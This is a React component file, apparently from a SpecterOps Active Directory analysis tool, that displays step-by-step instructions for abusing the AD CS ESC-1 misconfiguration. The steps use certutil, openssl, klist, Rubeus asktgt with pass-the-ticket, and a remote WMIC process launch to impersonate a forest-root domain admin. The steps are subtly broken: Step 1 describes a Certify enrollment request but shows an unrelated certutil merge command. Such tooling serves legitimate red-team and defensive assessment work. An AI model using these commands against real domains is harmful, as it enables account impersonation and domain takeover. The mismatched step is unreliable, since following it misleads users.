// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import {FC} from 'react';
import {Typography} from '@mui/material';

const WindowsAbuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                ADCS ESC-1 allows the principal to impersonate any other principal in the forest by enrolling in a
                template, then using the subsequent certificate to perform NT authentication against a service in the
                domain. An attacker may perform this attack in the following steps:
            </Typography>
            <Typography variant='body2'>
                <b>Step 1</b>: Use Certify to request enrollment in the affected template, specifying the affected
                certification authority and target principal to impersonate:
            </Typography>
            <Typography component={'pre'}>
                {
                    "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx "
                }
            </Typography>
            <Typography variant='body2'>
                <b>Step 2</b>: Convert the emitted certificate to PFX format:
            </Typography>
            <Typography component={'pre'}>
                {
                    "openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx"
                }
            </Typography>
            <Typography variant='body2'>
                <b>Step 3</b>: Optionally purge all kerberos tickets from memory:
            </Typography>
            <Typography component={'pre'}>
                {
                    "klist purge"
                }
            </Typography>
            <Typography variant='body2'>
                <b>Step 4</b>: Use Rubeus to request a ticket granting ticket from the domain, specifying the target
                identity to impersonate and the PFX-formatted certificate created in step 2:
            </Typography>
            <Typography component={'pre'}>
                {
                    "Rubeus asktgt /user:\"forestroot\\forestrootda\" /certificate:cert.pfx /password:asdf /ptt"
                }
            </Typography>
            <Typography variant='body2'>
                <b>Step 5</b>: Optionally verify the TGT by listing it with the klist command:
            </Typography>
            <Typography component={'pre'}>
                {
                    "klist"
                }
            </Typography>
            <Typography variant='body2'>
                <b>Step 6</b>: Verify successful impersonation of the target identity by running the following WMIC
                command:
            </Typography>
            <Typography component={'pre'}>
                {
                    "wmic /authority:\"kerberos:forestroot\\rootdomaindc\" /node:10.10.0.4 process call create \"whoami\""
                }
            </Typography>
        </>
    );
};

export default WindowsAbuse;
